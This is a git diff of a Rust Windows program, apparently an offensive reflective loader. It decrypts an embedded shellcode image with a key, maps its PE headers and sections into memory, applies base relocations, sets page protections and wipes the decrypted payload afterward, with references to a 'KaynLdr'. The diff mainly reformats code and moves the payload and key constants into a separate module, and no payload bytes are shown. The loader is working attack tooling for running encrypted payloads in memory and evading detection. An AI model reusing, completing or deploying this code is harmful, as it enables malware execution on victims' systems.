@@ -1,8 +1,12 @@
 #![allow(non_snake_case, non_camel_case_types)]
 
 use std::{
-    intrinsics::write_bytes, ptr::{copy_nonoverlapping, null_mut}, str::from_utf8
+    intrinsics::write_bytes,
+    ptr::{copy_nonoverlapping, null_mut},
+    str::from_utf8,
 };
+
+mod shellcode;
 
 use winapi::{
     ctypes::c_void,
@@ -13,20 +17,22 @@ use winapi::{
         winnt::{
             DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC,
             IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS, IMAGE_NT_SIGNATURE,
-            IMAGE_REL_BASED_DIR64,
-            IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
-            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-            PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
-        }
+            IMAGE_REL_BASED_DIR64, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE,
+            IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
+            PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
+        },
     },
 };
 
-const SHELLCODE: &[u8] = &[0x1, 0x2, .....];
+// const SHELLCODE: &[u8] = &[0x1, 0x2, .....];
 
-const KEY: &[u8] = &[
-    0x70, 0x6c, 0x6d, 0x6f, 0x6b, 0x6e, 0x69, 0x6a, 0x62, 0x75, 0x68, 0x76, 0x79, 0x67, 0x63, 0x74,
-    0x66, 0x78, 0x72, 0x64, 0x7a, 0x65, 0x73, 0x77, 0x61, 0x71,
-];
+// const KEY: &[u8] = &[
+//     0x70, 0x6c, 0x6d, 0x6f, 0x6b, 0x6e, 0x69, 0x6a, 0x62, 0x75, 0x68, 0x76, 0x79, 0x67, 0x63, 0x74,
+//     0x66, 0x78, 0x72, 0x64, 0x7a, 0x65, 0x73, 0x77, 0x61, 0x71,
+// ];
+
+const SHELLCODE: &[u8] = shellcode::SHELLCODE;
+const KEY: &[u8] = shellcode::KEY;
 
 // #pragma pack(1)
 // typedef struct
@@ -101,9 +107,8 @@ fn relocate_image(
             let block_size = (*current_br).SizeOfBlock as usize;
             if block_size >= size_of::<IMAGE_BASE_RELOCATION>() {
                 let entry_count = (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / 2;
-                let reloc_start = (current_br as *const u8)
-                    .add(size_of::<IMAGE_BASE_RELOCATION>())
-                    as *const u16;
+                let reloc_start =
+                    (current_br as *const u8).add(size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
 
                 let mut block_relocs = 0usize;
                 for i in 0..entry_count {
@@ -112,8 +117,7 @@ fn relocate_image(
                         let offset = reloc.offset() as usize;
                         let patch_addr = (image_base_real as *mut u8)
                             .add((*current_br).VirtualAddress as usize)
-                            .add(offset)
-                            as *mut usize;
+                            .add(offset) as *mut usize;
                         let old_val = patch_addr.read();
                         *patch_addr = old_val.wrapping_add(delta as usize);
                         block_relocs += 1;
@@ -123,7 +127,9 @@ fn relocate_image(
                 total_blocks += 1;
                 println!(
                     "    Reloc block: VA={:#x}, entries={}, patched={}",
-                    (*current_br).VirtualAddress, entry_count, block_relocs
+                    (*current_br).VirtualAddress,
+                    entry_count,
+                    block_relocs
                 );
             }
             current_br = (current_br as *const u8).add(block_size) as *const IMAGE_BASE_RELOCATION;
@@ -226,12 +232,11 @@ fn main() {
         );
 
         // Copy PE headers to the beginning of the allocation
-        copy_nonoverlapping(
-            shellcode.as_ptr(),
-            image_base as *mut u8,
-            hdr_size,
+        copy_nonoverlapping(shellcode.as_ptr(), image_base as *mut u8, hdr_size);
+        println!(
+            "[*] Copied PE headers ({} bytes) to {:p}",
+            hdr_size, image_base
         );
-        println!("[*] Copied PE headers ({} bytes) to {:p}", hdr_size, image_base);
 
         // Copy sections at their proper VirtualAddress offsets
         for i in 0..(*nt_header).FileHeader.NumberOfSections {
@@ -245,7 +250,12 @@ fn main() {
             let dest = (image_base as *mut u8).add((*section).VirtualAddress as usize);
             let size = (*section).SizeOfRawData as usize;
 
-            println!("[*] Copying section '{}' (VA={:#x}, size={:#x})...", name, (*section).VirtualAddress, size);
+            println!(
+                "[*] Copying section '{}' (VA={:#x}, size={:#x})...",
+                name,
+                (*section).VirtualAddress,
+                size
+            );
 
             copy_nonoverlapping(src, dest, size);
         }
@@ -272,11 +282,18 @@ fn main() {
             hdr_size,
             PAGE_READONLY,
             &mut hdr_old_protect,
-        ) == 0 {
-            println!("[-] VirtualProtectEx failed for headers: {}", GetLastError());
+        ) == 0
+        {
+            println!(
+                "[-] VirtualProtectEx failed for headers: {}",
+                GetLastError()
+            );
             return;
         }
-        println!("[*] Headers protected as PAGE_READONLY ({:#x} bytes)", hdr_size);
+        println!(
+            "[*] Headers protected as PAGE_READONLY ({:#x} bytes)",
+            hdr_size
+        );
 
         // Set section memory protections
         for i in 0..(*nt_header).FileHeader.NumberOfSections {
@@ -284,9 +301,8 @@ fn main() {
                 .unwrap()
                 .trim_matches(char::from(0));
             let section: *const IMAGE_SECTION_HEADER = first_section.add(i as usize);
-            let sec_mem = (image_base as *mut u8)
-                .add((*section).VirtualAddress as usize)
-                as *mut c_void;
+            let sec_mem =
+                (image_base as *mut u8).add((*section).VirtualAddress as usize) as *mut c_void;
 
             let sec_mem_size = if *(*section).Misc.VirtualSize() != 0 {
                 *(*section).Misc.VirtualSize() as usize
@@ -375,7 +391,10 @@ fn main() {
         let shellcode_len = shellcode.len();
         write_bytes(shellcode.as_mut_ptr(), 0, shellcode_len);
         drop(shellcode);
-        println!("[+] Wiped and freed decrypted shellcode ({} bytes)", shellcode_len);
+        println!(
+            "[+] Wiped and freed decrypted shellcode ({} bytes)",
+            shellcode_len
+        );
 
         kayn_args.KaynLdr = null_mut();
         kayn_args.DllCopy = null_mut();
